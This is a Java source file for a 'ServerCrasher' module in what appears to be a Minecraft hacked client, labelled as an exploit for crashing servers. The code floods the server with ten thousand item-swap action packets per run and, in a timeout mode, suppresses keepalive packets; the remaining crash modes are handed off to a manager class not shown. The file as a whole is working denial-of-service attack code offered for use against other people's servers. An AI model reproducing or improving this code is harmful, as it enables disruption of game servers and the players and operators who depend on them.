package me.constantindev.ccl.module;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.MType;
import me.constantindev.ccl.etc.ServerCrasherManager;
import me.constantindev.ccl.etc.base.Module;
import me.constantindev.ccl.etc.config.MultiOption;
import me.constantindev.ccl.etc.config.Num;
import me.constantindev.ccl.etc.event.EventHelper;
import me.constantindev.ccl.etc.event.EventType;
import me.constantindev.ccl.etc.event.arg.PacketEvent;
import me.constantindev.ccl.etc.helper.ClientHelper;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class ServerCrasher extends Module {
    public ServerCrasher() {
        super("ServerCrasher", "Several ways to crash a server", MType.EXPLOIT);
        this.mconf.add(new MultiOption("mode", "rotation", new String[]{"rotation", "location", "biglocation", "swing", "nprtimeout"}));
        this.mconf.add(new Num("strength", 100.0, 100, 1));
        Module parent = this;
        EventHelper.BUS.registerEvent(EventType.ONPACKETSEND, eventArg -> {
            if (((PacketEvent) eventArg).packet instanceof KeepAliveC2SPacket) {
                if (parent.mconf.getByName("mode").value.equals("nprtimeout") && parent.isOn.isOn()) {
                    eventArg.cancel();
                    ClientHelper.sendChat("[Crasher:NPRTimeout] Cancelled keepalive packet");
                }
            }
        });
        ServerCrasherManager.runner.start();
    }

    @Override
    public void onExecute() {
        int strength = (int) ((Num) this.mconf.getByName("strength")).getValue();
        ServerCrasherManager.mode = this.mconf.getByName("mode").value;
        ServerCrasherManager.strength = strength;
        if (ServerCrasherManager.mode.equalsIgnoreCase("swing")) {
            if (Cornos.minecraft.getNetworkHandler() == null) {
                this.isOn.setState(false);
                return;
            }
            try {
                for (int i = 0; i < 10000; i++) {
                    PlayerActionC2SPacket p = new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
                    Cornos.minecraft.getNetworkHandler().sendPacket(p);
                }

            } catch (Exception ignored) {
                this.isOn.setState(false);
            }
        }
        super.onExecute();
    }
}
